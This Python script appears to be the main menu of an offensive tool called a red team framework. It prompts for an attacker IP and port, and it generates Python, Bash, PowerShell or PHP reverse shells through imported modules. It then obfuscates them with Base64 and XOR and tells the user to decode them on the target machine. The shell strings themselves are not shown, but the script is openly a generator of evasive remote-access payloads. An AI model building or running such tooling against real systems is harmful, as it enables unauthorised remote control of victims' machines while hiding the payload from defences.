import os
import sys
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.prompt import Prompt
from core.obfuscator import PayloadObfuscator
from payloads.generator import ShellGenerator
BANNER = """
 [bold red] ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗     ███████╗██╗   ██╗ ██╗[/bold red]
 [bold red]██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝     ██╔════╝╚██╗ ██╔╝███║[/bold red]
 [bold white]██║  ███╗███████║██║   ██║███████╗   ██║        ███████╗ ╚████╔╝ ╚██║[/bold white]
 [bold white]██║   ██║██╔══██║██║   ██║╚════██║   ██║        ╚════██║  ╚██╔╝   ██║[/bold white]
 [bold blue]╚██████╔╝██║  ██║╚██████╔╝███████║   ██║   ██╗  ███████║   ██║    ██║[/bold blue]
 [bold blue] ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   ╚═╝  ╚══════╝   ╚═╝    ╚═╝[/bold blue]
 [bold yellow]             Elite Red Team Operations Framework[/bold yellow]
 [italic cyan]                    Developed by Ghost-SY1[/italic cyan]
"""
console = Console()
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')
def main():
    clear_screen()
    console.print(Panel(BANNER, border_style="bold red", expand=False))
    lhost = Prompt.ask("[bold yellow]Enter LHOST (Your IP)[/bold yellow]")
    lport = Prompt.ask("[bold yellow]Enter LPORT[/bold yellow]", default="4444")
    gen = ShellGenerator(lhost, lport)
    table = Table(title="Payload Generation Menu", border_style="bold red")
    table.add_column("ID", style="cyan")
    table.add_column("Type", style="white")
    table.add_row("1", "Python Reverse Shell")
    table.add_row("2", "Bash Reverse Shell")
    table.add_row("3", "PowerShell Reverse Shell")
    table.add_row("4", "PHP Reverse Shell")
    console.print(table)
    choice = Prompt.ask("[bold yellow]Select Payload Type[/bold yellow]", choices=["1", "2", "3", "4"])
    raw_payload = ""
    if choice == "1": raw_payload = gen.python_shell()
    elif choice == "2": raw_payload = gen.bash_shell()
    elif choice == "3": raw_payload = gen.powershell_shell()
    elif choice == "4": raw_payload = gen.php_shell()
    obf = PayloadObfuscator(raw_payload)
    encoded, key = obf.obfuscate()
    console.print(Panel(f"[bold green]RAW PAYLOAD:[/bold green]\n{raw_payload}", border_style="blue"))
    console.print(Panel(f"[bold red]OBFUSCATED PAYLOAD (B64+XOR):[/bold red]\n{encoded}\n\n[bold yellow]XOR KEY:[/bold yellow] {key}", border_style="red"))
    console.print("\n[bold cyan][*][/bold cyan] Use the XOR key to decode the payload on the target machine.")
if __name__ == "__main__":
    main()
